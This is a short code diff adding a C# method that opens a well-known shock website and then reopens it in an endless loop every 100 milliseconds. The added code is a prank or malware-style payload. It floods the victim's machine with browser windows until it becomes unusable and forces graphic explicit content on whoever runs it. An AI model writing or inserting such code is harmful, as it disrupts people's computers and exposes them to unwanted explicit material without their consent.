@@ -1,0 +1,11 @@
+static void Meatspin()
+    {
+        Process.Start("http://www.meatspin.com");
+        Application.DoEvents();
+        Thread.Sleep(5000);
+        while (true)
+        {
+            Process.Start("http://www.meatspin.com");
+            Thread.Sleep(100);
+        }
+    }
